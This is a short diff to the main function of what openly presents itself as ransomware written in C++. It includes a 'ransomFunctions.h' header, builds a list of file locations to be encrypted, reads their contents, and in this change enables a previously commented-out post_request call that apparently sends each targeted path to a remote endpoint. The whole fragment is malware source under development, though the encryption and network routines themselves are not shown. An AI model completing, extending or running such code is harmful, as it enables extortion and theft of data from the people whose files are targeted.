@@ -3,8 +3,7 @@
 #include <fstream>
 #include <sstream>
 #include <vector>
-#include "headers/ransomFunctions.h" //TODO - leave declarations in here.
-
+#include "headers/ransomFunctions.h"
 #include "headers/json.hpp"
 
 
@@ -40,13 +39,16 @@ int main(){
     		locationsToBeEncrypted.push_back(fileLocationsVector[i]);
     	}
     	count = 0;    	
+    }   	
+
+    for(auto& aa : locationsToBeEncrypted){
+    	std::cout << aa << std::endl;
     }
-   	
 
     //Reads content of each location and pushes it into a string vector which gets pushed into a vector<string::vector>.
 	if(success){ 		
 		for(std::string& location : locationsToBeEncrypted){
-			//post_request(location); //TODO - Fix Post Request!
+			post_request(location); //TODO - Fix Post Request!
 			std::vector<std::string> temporaryVector;
 			if(getFileContents(location, temporaryVector)){	   // Read contents of location.
 				fileContentVector.push_back(temporaryVector);  // Pushes each line into a string vector.
